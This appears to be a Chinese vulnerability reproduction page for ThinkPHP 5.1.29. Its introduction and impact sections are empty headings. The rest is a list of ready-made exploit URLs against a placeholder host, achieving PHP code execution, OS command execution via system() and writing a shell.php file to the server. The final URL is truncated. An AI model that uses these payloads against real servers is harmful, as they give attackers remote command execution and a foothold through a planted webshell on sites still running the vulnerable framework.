Thinkphp 5.1.29
===============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 1、代码执行

    http://www.0-sec.org/?s=index/\think\Request/input&filter=phpinfo&data=1

    http://www.0-sec.org/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

    http://www.0-sec.org/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

### 2、命令执行

    http://www.0-sec.org/?s=index/\think\Request/input&filter=system&data=操作系统命令

    http://www.0-sec.org/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令

    http://www.0-sec.org/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令

### 3、文件写入

    http://www.0-sec.org/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E

    http://www.0-sec.org/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3
